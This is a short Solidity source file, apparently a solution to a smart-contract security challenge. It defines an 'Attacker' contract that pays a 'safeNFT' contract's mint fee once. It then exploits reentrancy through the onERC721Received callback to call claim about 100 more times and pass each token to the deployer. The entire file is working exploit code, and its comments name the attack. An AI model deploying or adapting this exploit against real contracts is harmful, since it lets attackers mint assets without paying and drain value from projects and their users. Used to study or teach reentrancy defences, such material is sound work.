// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;
import "./safeNFT.sol";
contract Attacker is IERC721Receiver{

    safeNFT target;
    address hacker;

    constructor(address _target){
        target = safeNFT(_target);
        hacker = msg.sender;
    }

    // Pay fee for minting + claim NFT.
    function buynFT() external payable { //1 step
        target.buyNFT{value: msg.value}();
        target.claim();
    }

    // Reentrancy. It will claim 100 times the NFT after paying only once for the fee.
    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4){ 
      target.transferFrom(address(this), hacker, tokenId);

      for (uint i; i<100;){
            target.claim();
            ++i;
      }

      return IERC721Receiver.onERC721Received.selector;
    }

}